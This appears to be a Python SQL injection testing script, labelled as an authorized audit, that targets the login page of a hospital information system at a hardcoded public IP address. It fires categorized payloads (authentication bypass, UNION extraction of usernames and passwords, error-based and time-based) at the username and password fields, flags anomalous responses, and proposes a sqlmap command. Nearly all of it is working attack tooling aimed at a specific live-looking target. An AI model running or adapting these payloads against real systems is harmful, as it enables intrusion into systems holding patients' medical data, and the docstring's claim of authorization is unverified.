#!/usr/bin/env python3
"""
SQL INJECTION TESTING - HosVital HIS Login
Auditoria Autorizada - Cuidarte Tu Salud

Prueba payloads de SQLi en los campos del login del HIS.
GeneXus 10.1 sobre Java/Tomcat puede ser vulnerable a SQLi
dependiendo de como se generaron las queries.

Uso:
  python3 05_test_sqli.py
  python3 05_test_sqli.py -v  # verbose
"""

import requests
import sys
import time
import argparse

TARGET = "http://190.66.24.91:3155/WEBHOSREAL/servlet/login"

# Respuestas baseline para comparacion
BASELINE = {
    "user_not_found_size": 9974,      # "El Usuario Ingresado No Existe"
    "user_exists_bad_pwd": 11178,     # Usuario existe, password incorrecta
    "error_text": "El Usuario Ingresado No Existe",
    "error_text2": "El Usuario Digitado No Tiene Centro De Costo",
}

# Payloads SQLi clasificados por tipo
SQLI_PAYLOADS = {
    "authentication_bypass": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR 1=1 --",
        "' OR 1=1#",
        "admin' --",
        "admin' #",
        "') OR ('1'='1",
        "') OR ('1'='1' --",
        "' OR ''='",
        "1' OR '1'='1",
        "' OR 'x'='x",
        "' OR 1=1 LIMIT 1 --",
    ],
    "union_based": [
        "' UNION SELECT NULL --",
        "' UNION SELECT NULL,NULL --",
        "' UNION SELECT NULL,NULL,NULL --",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT username,password FROM users --",
        "' UNION ALL SELECT NULL --",
    ],
    "error_based": [
        "'",
        "''",
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "1' AND 1=CONVERT(int,(SELECT @@version)) --",
        "' AND 1=1 AND ''='",
    ],
    "time_based": [
        # Oracle (comun en GeneXus sobre Java)
        "' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) IS NOT NULL --",
        # MySQL
        "' OR SLEEP(5) --",
        "' OR BENCHMARK(5000000,MD5('test')) --",
        # SQL Server
        "'; WAITFOR DELAY '0:0:5' --",
        # PostgreSQL
        "'; SELECT pg_sleep(5) --",
    ],
    "genexus_specific": [
        # GeneXus usa parametros con formato especifico
        "PRUEBA' AND '1'='1",
        "PRUEBA' OR '1'='1",
        "PRUEBA'; --",
        "PRUEBA' UNION SELECT 1 --",
        # Bypass de validacion GeneXus
        "PRUEBA%27",
        "PRUEBA%27%20OR%20%271%27%3D%271",
    ],
}


def test_payload(field, payload, verbose=False):
    """Envia un payload SQLi y analiza la respuesta."""
    s = requests.Session()
    try:
        # GET para cookies
        s.get(TARGET, timeout=10)

        if field == "vUSUARIO1":
            data = {
                "vUSUARIO1": payload,
                "vCONTRASENA": "test123",
                "vMODULO": "HC",
                "vCSEDENOM": "0",
                "GXState": '{"_EventName":"ENTER"}',
            }
        else:
            data = {
                "vUSUARIO1": "PRUEBA",
                "vCONTRASENA": payload,
                "vMODULO": "HC",
                "vCSEDENOM": "0",
                "GXState": '{"_EventName":"ENTER"}',
            }

        start = time.time()
        r = s.post(TARGET, data=data, timeout=30, allow_redirects=False)
        elapsed = time.time() - start

        size = len(r.content)
        status = r.status_code
        body = r.text

        # Analisis de indicadores
        has_error = BASELINE["error_text"] in body
        has_sedes = "BOSQUE" in body
        is_redirect = status in (301, 302)
        redirect_to = r.headers.get("Location", "")
        is_slow = elapsed > 4.0  # posible time-based
        has_sql_error = any(kw in body.lower() for kw in [
            "sql", "syntax", "oracle", "mysql", "exception",
            "error", "stack trace", "jdbc", "genexus",
            "sqlstate", "ora-", "pg::", "microsoft",
        ])

        # Tamano inusual?
        unusual_size = abs(size - BASELINE["user_not_found_size"]) > 500 and \
                       abs(size - BASELINE["user_exists_bad_pwd"]) > 500

        suspicious = is_redirect or is_slow or has_sql_error or unusual_size

        result = {
            "field": field,
            "payload": payload,
            "status": status,
            "size": size,
            "time": round(elapsed, 2),
            "redirect": redirect_to,
            "has_error_msg": has_error,
            "has_sedes": has_sedes,
            "has_sql_error": has_sql_error,
            "unusual_size": unusual_size,
            "is_slow": is_slow,
            "suspicious": suspicious,
        }

        if verbose or suspicious:
            flag = " <=== SUSPICIOUS!" if suspicious else ""
            print(f"    [{status}] {size}b {elapsed:.2f}s | "
                  f"err={has_error} sedes={has_sedes} sqlerr={has_sql_error} "
                  f"slow={is_slow}{flag}")

        return result

    except Exception as e:
        return {
            "field": field,
            "payload": payload,
            "status": "ERROR",
            "error": str(e),
            "suspicious": "timeout" in str(e).lower(),
        }


def main():
    parser = argparse.ArgumentParser(description="SQLi Testing - HosVital HIS")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("-d", "--delay", type=float, default=1.0)
    parser.add_argument("-o", "--output", default="sqli_results.txt")
    parser.add_argument("--field", choices=["vUSUARIO1", "vCONTRASENA", "both"],
                        default="both", help="Campo a probar")
    args = parser.parse_args()

    fields = ["vUSUARIO1", "vCONTRASENA"] if args.field == "both" else [args.field]

    print("=" * 70)
    print(" SQL INJECTION TESTING - HosVital HIS")
    print("=" * 70)
    print(f"[*] Target: {TARGET}")
    print(f"[*] Campos: {fields}")
    print(f"[*] Framework: GeneXus Java v10.1.7")

    total_payloads = sum(len(v) for v in SQLI_PAYLOADS.values())
    print(f"[*] Total payloads: {total_payloads} x {len(fields)} campos")
    print(f"[*] Delay: {args.delay}s")
    print()

    # Primero establecer baseline
    print("[*] Estableciendo baseline...")
    s = requests.Session()
    s.get(TARGET, timeout=10)
    r = s.post(TARGET, data={
        "vUSUARIO1": "BASELINE_TEST_USER",
        "vCONTRASENA": "baseline",
        "vMODULO": "HC", "vCSEDENOM": "0",
        "GXState": '{"_EventName":"ENTER"}',
    }, timeout=15)
    print(f"  Baseline (user no existe): {len(r.content)} bytes, HTTP {r.status_code}")

    suspicious_results = []
    count = 0

    for field in fields:
        print(f"\n{'='*70}")
        print(f" Campo: {field}")
        print(f"{'='*70}")

        for category, payloads in SQLI_PAYLOADS.items():
            print(f"\n  [{category}] ({len(payloads)} payloads)")

            for payload in payloads:
                count += 1
                display_payload = payload[:50].replace("\n", "\\n")
                if not args.verbose:
                    sys.stdout.write(f"\r  [{count}] {display_payload:<50}")
                    sys.stdout.flush()
                else:
                    print(f"  [{count}] {field}={display_payload}")

                result = test_payload(field, payload, verbose=args.verbose)

                if result.get("suspicious"):
                    suspicious_results.append(result)
                    if not args.verbose:
                        print(f"\n  [!] SOSPECHOSO: {field}={display_payload}")
                        print(f"      HTTP {result['status']}, {result.get('size', '?')}b, "
                              f"{result.get('time', '?')}s")

                time.sleep(args.delay)

        print()

    print("\n" + "=" * 70)
    print(f" RESULTADOS SQLi")
    print("=" * 70)
    print(f"[*] Total probados: {count}")
    print(f"[!] Sospechosos: {len(suspicious_results)}")

    if suspicious_results:
        print("\n RESULTADOS SOSPECHOSOS:")
        for r in suspicious_results:
            print(f"\n  Campo: {r['field']}")
            print(f"  Payload: {r['payload']}")
            print(f"  Status: {r.get('status')}")
            print(f"  Size: {r.get('size')}b")
            print(f"  Time: {r.get('time')}s")
            print(f"  SQL Error: {r.get('has_sql_error')}")
            print(f"  Slow: {r.get('is_slow')}")
    else:
        print("\n  No se encontraron indicadores claros de SQLi.")
        print("  Considerar usar sqlmap para pruebas mas profundas:")
        print(f'  sqlmap -u "{TARGET}" --data "vUSUARIO1=test&vCONTRASENA=test&vMODULO=HC&vCSEDENOM=0" -p vUSUARIO1,vCONTRASENA --risk 2 --level 3')

    with open(args.output, "w") as f:
        f.write(f"# SQLi Test Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Target: {TARGET}\n")
        f.write(f"# Payloads probados: {count}\n")
        f.write(f"# Sospechosos: {len(suspicious_results)}\n\n")
        for r in suspicious_results:
            f.write(f"SUSPICIOUS: {r['field']}={r['payload']}\n")
            f.write(f"  Status={r.get('status')} Size={r.get('size')} "
                    f"Time={r.get('time')} SQLErr={r.get('has_sql_error')}\n\n")

    print(f"\n[+] Resultados en: {args.output}")


if __name__ == "__main__":
    main()
